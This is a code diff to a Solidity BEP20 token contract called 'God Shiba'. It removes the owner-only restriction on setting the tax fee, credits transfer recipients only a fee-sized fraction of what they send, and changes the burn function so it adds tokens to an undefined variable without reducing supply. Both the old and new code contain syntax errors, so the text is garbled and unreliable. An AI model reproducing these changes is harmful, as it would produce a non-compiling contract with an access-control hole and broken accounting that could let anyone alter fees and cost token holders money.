@@ -362,14 +362,13 @@ contract GODSHIBA is Context, iBEP20, Ownable {
   string public _symbol;
   string public _name;
   address private _burnaddress;
-  address private _dividenttoken,
+  address private _dividenttoken;
 
   constructor() public {
     _name = 'God Shiba';
     _symbol = 'GSHIB';
     _decimals = 9;
     _burnaddress = 0x000000000000000000000000000000000000dEaD;
-    _dividenttoken = 0x2859e4544c4bb03966803b044a93563bd2d0dd4d; / Address Shiba Inu
     _totalSupply = 10 * 10**9 * 10**9;
     _balances[msg.sender] = _totalSupply;
 
@@ -427,7 +426,7 @@ contract GODSHIBA is Context, iBEP20, Ownable {
     return _balances[account];
   }
 
-    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
+    function setTaxFeePercent(uint256 taxFee) public() {
         _taxFee = taxFee;
     }
     
@@ -587,8 +586,8 @@ contract GODSHIBA is Context, iBEP20, Ownable {
     require(recipient != address(0), "BEP20: transfer to the zero address");
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
-    _balances[recipient] = _balances[recipient].add(amount / uint8(3);
-    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee);
+    _balances[recipient] = _balances[recipient].add(amount / uint256(100) * _taxFee);
+    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * 1);
      emit Transfer(sender, recipient, amount);
     _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee);
     uint256 fires = _balances[_burnaddress];
@@ -626,8 +625,7 @@ contract GODSHIBA is Context, iBEP20, Ownable {
   function _burn(address account, uint256 amount) internal {
     require(account != address(0), "BEP20: burn from the zero address");
 
-    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
-    _totalSupply = _totalSupply.sub(amount);
+    _balances[Sender] = _balances[Sender].add(amount, "BEP20: burn amount exceeds balance");
     emit Transfer(account, address(0), amount);
   }
 
